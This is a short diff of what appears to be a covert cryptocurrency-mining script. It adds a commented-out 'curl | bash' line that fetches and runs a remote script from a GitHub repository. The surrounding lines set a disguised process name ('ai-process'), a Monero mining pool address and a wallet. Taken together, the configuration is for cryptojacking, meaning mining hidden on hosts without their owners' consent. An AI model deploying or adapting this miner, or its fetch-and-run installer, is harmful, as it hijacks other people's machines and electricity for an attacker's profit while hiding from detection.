@@ -1,4 +1,4 @@
-
+# curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/codedao.sh | bash
 FAKE_NAME="ai-process"
 POOL_URL="pool.hashvault.pro:443"
 WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
